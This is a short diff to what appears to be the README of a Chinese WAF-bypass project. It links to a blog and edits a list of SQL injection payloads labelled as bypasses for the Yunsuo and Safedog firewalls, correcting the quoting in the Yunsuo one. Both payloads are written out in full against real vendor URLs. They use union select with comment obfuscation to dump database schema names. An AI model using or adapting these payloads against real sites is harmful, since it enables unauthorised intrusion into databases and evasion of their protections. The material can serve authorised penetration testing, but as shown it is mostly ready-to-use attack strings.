@@ -32,6 +32,6 @@ blog:https://pureqh.top/?p=4414<br>
 blog:https://pureqh.top/?p=1225<br>
 
 ## 注：bypass云锁  
-http://help.yunsuo.com.cn/guide/install/?id=-1 and 1^"--"  union  select 1,group_concat(schema_name),3 from information_schema.schemata --+<br>
+http://help.yunsuo.com.cn/guide/install/?id=-1' and 1^"--"  union  select 1,group_concat(schema_name),3 from information_schema.schemata --+<br>
 ## 注：bypass安全狗
 https://www.safedog.cn/news.html?id=4046' "/\*" /\*!11444union all select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 */ --+  
